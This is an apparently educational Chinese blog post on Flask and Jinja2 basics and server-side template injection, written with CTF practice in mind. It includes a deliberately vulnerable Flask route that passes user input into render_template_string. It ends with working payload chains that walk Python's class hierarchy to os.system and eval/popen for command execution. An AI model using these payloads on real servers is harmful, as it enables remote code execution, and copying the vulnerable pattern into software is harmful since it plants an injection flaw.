---
layout: post
title: 2020-12-07-SSTI模板注入与Flask基础（略带沙箱逃逸）
date: 2020-12-07
categories: blog
tags: [web,php]
description: 学习Flask模板注入了
typora-copy-images-to: ..\img
typora-root-url: ..
---

# SSTI模板注入与Flask基础

### Flask简介

Flask是一个Python上的**Web应用程序框架**（Web Application Framework）。

**Web应用程序框架**是一个库和模块的集合，使Web应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等低级细节。



Flask基于**Werkzeug WSGI**工具包和**Jinja2**模板引擎。

> ##### Werkzeug
>
> 它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。
>
> ##### jinja2
>
> jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。
>
> Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。

**Jinjia模板引擎特点**

![img](/img/GWPZOU`R82WY3%4ST{W[}JI.png)

**控制语句**

![image-20201222222445589](/img/image-20201222222445589.png)

 **注意：不可以使用`continue`和`break`表达式来控制循环的执行。**

**过滤器**

过滤器是通过（`|`）符号进行使用的，例如：`{{ name|length }}：`将返回name的长度。

过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中。

## SSTi漏洞的产生

ssti漏洞产生于网页模板中的变量被二次渲染时。

什么是二次渲染，这里用两个例子简单展示：

无二次渲染：

```python
from flask import *

app=Flask(__name__)
@app.route('/')
def index():
    str=request.args.get('s')
    html='<h1>Welcome</h1></br><p>{{str}}</p>'
    return render_template_string(html,str=str)
if __name__=='__main__':
    app.run()
```

有二次渲染行为：

```python
from flask import *

app=Flask(__name__)
@app.route('/')
def index():
    str=request.args.get('s')
    html="<h1>Welcome</h1></br><p>%s</p>"%(str)
    return render_template_string(html)
if __name__=="__main__":
    app.run()
```

如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行该模板引擎的控制语句以及命令

Flask SSTI 题的基本思路就是利用 python 中的 **魔术方法** 找到自己要用的函数。

```
__dict__：保存类实例或对象实例的属性变量键值对字典

__class__：返回调用的参数类型

__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 

__base__: 返回该对象所继承的基类

__bases__：返回该对象所继承的类型列表

__subclasses__：以一个列表的形式返回对象的子类

__init__：类的初始化方法

__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
```

基本步骤：

使用魔术方法进行函数解析，再获取基本类：

```python
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
```

获取基本类后，继续向下获取基本类 object 的子类：

```python
object.__subclasses__()
```

这里有可能子类中就含有可以利用的函数，如file,eval等，但是一般是没有的

可以用以下模板控制语句找找看

![image-20201222222642704](/img/image-20201222222642704.png)

找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：

```python
>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>
>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

或者用模板控制语句找到可以利用的模块，或者__builtins__

![image-20201222222733823](/img/image-20201222222733823.png)



构造payload

```
''.__class__.__base__.__subclasses__()[59]

''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']

''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')

''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')

''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("whoami").read()')
```

